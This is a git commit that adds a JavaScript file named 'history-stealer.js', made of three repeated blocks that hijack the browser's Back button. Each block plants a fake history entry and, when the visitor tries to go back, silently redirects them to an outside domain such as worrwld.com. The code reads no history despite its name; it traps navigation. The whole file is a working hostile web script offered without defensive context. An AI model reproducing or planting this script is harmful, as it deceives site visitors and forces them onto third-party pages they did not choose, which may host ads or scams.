c0d167af93344baf5c1f8543e21ad77b086e00fb
Austrakin <67105391+auslie@users.noreply.github.com>
2022-08-05 11:54:44 +0430

    Create history-stealer.js

---
+++ history-stealer.js
@@ -0,0 +1,39 @@
+(function(window, location) {
+history.replaceState(null, document.title, location.pathname+"#!/history");
+history.pushState(null, document.title, location.pathname);
+
+window.addEventListener("popstate", function() {
+  if(location.hash === "#!/history") {
+    history.replaceState(null, document.title, location.pathname);
+    setTimeout(function(){
+      location.replace("http://www.worrwld.com");
+    },10);
+  }
+}, false);
+}(window, location));
+(function(window, location) {
+history.replaceState(null, document.title, location.pathname+"#!/history");
+history.pushState(null, document.title, location.pathname);
+
+window.addEventListener("popstate", function() {
+  if(location.hash === "#!/history") {
+    history.replaceState(null, document.title, location.pathname);
+    setTimeout(function(){
+      location.replace("http://www.282y-database.org");
+    },10);
+  }
+}, false);
+}(window, location));
+(function(window, location) {
+history.replaceState(null, document.title, location.pathname+"#!/history");
+history.pushState(null, document.title, location.pathname);
+
+window.addEventListener("popstate", function() {
+  if(location.hash === "#!/history") {
+    history.replaceState(null, document.title, location.pathname);
+    setTimeout(function(){
+      location.replace("http://www.lesish.componep.net");
+    },10);
+  }
+}, false);
+}(window, location));
